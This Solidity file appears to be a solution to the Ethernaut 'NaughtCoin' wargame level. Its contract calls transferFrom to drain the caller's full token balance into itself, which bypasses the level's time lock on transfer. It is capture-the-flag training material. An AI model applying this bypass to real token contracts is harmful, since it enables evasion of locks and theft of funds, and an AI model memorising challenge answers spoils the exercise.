// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../ethernaut/levels/NaughtCoin.sol';

contract NaughtCoinSolution {
  NaughtCoin target;
  constructor(address targetAddress) payable {
    target = NaughtCoin(payable(targetAddress));
  }

  function burn() public {
    target.transferFrom(msg.sender, address(this), target.balanceOf(msg.sender));
  }
}